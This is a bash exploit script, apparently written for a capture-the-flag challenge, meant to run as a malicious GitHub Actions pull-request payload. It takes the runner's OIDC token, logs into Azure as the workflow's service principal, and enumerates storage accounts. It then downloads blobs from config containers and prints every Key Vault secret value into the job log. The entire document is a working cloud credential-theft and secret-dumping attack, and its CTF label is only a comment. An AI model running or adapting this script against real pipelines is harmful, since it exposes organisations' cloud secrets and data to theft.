#!/usr/bin/env bash
# DFCD CTF jeo#9 — authorized pwn-request exploit (read-only Azure enum to recover the flag)
set +e
AUD="api:""//AzureADTokenExchange"
echo "=====PWN_START====="
echo "[*] env: CLIENT=${AZURE_CLIENT_ID} TENANT=${AZURE_TENANT_ID} SUB=${AZURE_SUBSCRIPTION_ID}"
IDT=$(curl -sS -H "Authorization: bearer ${ACTIONS_ID_TOKEN_REQUEST_TOKEN}" "${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=${AUD}" | python3 -c 'import sys,json;print(json.load(sys.stdin).get("value",""))')
echo "[*] GH OIDC token len=${#IDT}"
az login --service-principal -u "${AZURE_CLIENT_ID}" -t "${AZURE_TENANT_ID}" --federated-token "${IDT}" --allow-no-subscriptions >/tmp/login.json 2>/tmp/login.err
echo "[*] az login rc=$?"
az account show -o json 2>/tmp/acct.err | python3 -c 'import sys,json;d=json.load(sys.stdin);print("acct:",d.get("name"),d.get("id"),d.get("user",{}).get("name"))' 2>/dev/null || { echo "login.err:"; cat /tmp/login.err; }
echo "=====STORAGE_ACCOUNTS====="
az storage account list -o json 2>/tmp/sa.err | python3 -c 'import sys,json
try:
 for a in json.load(sys.stdin): print(a["name"], a.get("resourceGroup"), (a.get("primaryEndpoints") or {}).get("blob"))
except Exception as e: print("ERR",e)'
head -3 /tmp/sa.err 2>/dev/null
echo "=====READ config blobs====="
for SA in $(az storage account list --query "[].name" -o tsv 2>/dev/null); do
  echo "--- $SA ---"
  az storage container list --account-name "$SA" --auth-mode login -o tsv --query "[].name" 2>/dev/null
  for C in config configs app-config internal; do
    az storage blob list --account-name "$SA" -c "$C" --auth-mode login -o tsv --query "[].name" 2>/dev/null | while read B; do
      echo "[blob] $SA/$C/$B ="
      az storage blob download --account-name "$SA" -c "$C" -n "$B" --auth-mode login -f /dev/stdout --no-progress 2>/dev/null
      echo
    done
  done
done
echo "=====KEY VAULTS====="
for KV in $(az keyvault list --query "[].name" -o tsv 2>/dev/null); do
  echo "--- vault $KV ---"
  az keyvault secret list --vault-name "$KV" -o tsv --query "[].name" 2>/dev/null | while read s; do
     echo "secret:$s = $(az keyvault secret show --vault-name "$KV" -n "$s" --query value -o tsv 2>/dev/null)"
  done
done
echo "=====PWN_END====="
